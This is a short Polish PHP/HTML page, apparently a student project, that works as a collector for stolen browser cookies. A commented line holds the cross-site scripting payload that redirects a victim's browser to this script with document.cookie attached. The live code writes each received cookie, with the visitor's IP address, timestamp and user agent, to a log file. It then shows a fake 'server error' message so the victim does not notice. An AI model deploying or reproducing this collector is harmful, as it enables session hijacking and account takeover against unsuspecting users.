<!DOCTYPE HTML>
<html lang="pl">
<head>
    <meta charset="utf-8" />
    <title>Projekt</title>
    <link href="css/style.css" rel="stylesheet" type="text/css" />
    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
</head>

<body>  


<?php
/*
//window.location.href = 'http://orfi.uwm.edu.pl/~s130719/test.php?cookie='+document.cookie
$cookie = "\n".$_GET['cookie'];

$handle = fopen ('logi.txt', "a+");
fwrite($handle, $cookie);
fclose($handle);
echo('CHWILOWY BLAD SERWERA! Sprobuj za 120 minut ponownie!');
*/
?>

<?php
$hour = date("Y-m-d H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adresIP = $_SERVER['REMOTE_ADDR'];
$cookie = "\n".$adresIP." [".$hour.'] - '.$_GET['cookie'].' - '.$browser;
//$cookie = "a--".$_GET['cookie'];

$handle = fopen ('logi.txt', "a+");
fwrite($handle, $cookie);
fclose($handle);
echo('CHWILOWY BLAD SERWERA! Sprobuj za 120 minut ponownie!');
?>

</body>


</html>

